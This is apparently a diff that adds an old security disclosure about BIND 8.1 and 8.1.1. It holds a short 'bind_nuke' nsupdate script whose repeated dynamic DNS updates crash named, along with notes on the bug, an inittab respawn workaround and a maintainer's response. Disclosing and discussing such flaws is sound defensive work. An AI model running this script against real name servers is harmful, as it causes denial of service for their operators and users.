@@ -1,0 +1,70 @@
+
+-------------------------------------------------->
+#!/bin/bash
+
+echo 'bind_nuke (c) Artur Skawina skawina@usa.net'
+
+nsupdate <<END
+update delete x.$1 A
+update add x.$1 60 IN A 3.2.3.6
+update delete x.$1 A
+
+END
+<--------------------------------------------------
+
+when executed as "bind_nuke bogus.org" on a host, that bogus.org's
+primary NS is configured to accept updates from, will cause named
+to silently die. Nothing in the logs, nothing on the console.
+After a number of similar packets has been received by named any
+subsequent attempt to run it will only result in a Segmentation Fault.
+[and there's "spoofing"...]
+
+The problem seems to be that bind can not handle updating the
+same RR more than once in the same DNS packet.
+And as it saves the update requests in the <zone>.log file
+and attempts to perform the updates again when restarted,
+the bug is triggered again...
+
+The bug is present in both bind8.1 and bind8.1.1.
+With bind8.1 one such DU packet was enough to prevent named from runing,
+until the /var/named/pri/<zone>.log file was removed/edited.
+Bind 8.1.1 needs a few packets (but usually <=3) before this happens
+(named still dies after only one packet, but it is sometimes possible to
+restart it w/o any immediate errors/warnings).
+
+
+----------------------------------------------------
+
+(This workaround won't work for the attack listed, but it's still useful to
+know..)
+
+If you're using named 8.*, it can be run out of inittab with the
+non-daemonising switch.
+
+On linuxen:
+
+/etc/inittab
+
+bi:2345:respawn:/usr/sbin/named -f
+
+At least this way, should it die, it'll come back within seconds.
+
+-----------------------------------------------------
+
+
+If you don't enable updates for a zone, or you enable them only from hosts
+within an intelligent (source routing prohibited, source addresses checked)
+firewall, bind is immune to the "bind_nuke" attack published here recently.
+
+updates aren't on by default, and according to rfc 2136 dns updates are not
+recommended except from "localhost" which is assumed to be secure.  (though
+i wish that more system vendors would disallow source-address 127.0.0.1 from
+coming in off the network.)  for this reason we have not published a patch
+to bind-8.1.1.  i expect that we will put bind-8.1.2 into beta testing in a
+few weeks.  (note that we still won't have support for rfc 2137 or TSIG; if
+any system vendors would like to fund that effort, we'd love to work on it.)
+
+mountain.  molehill.
+
+
+------------------------------------------------------
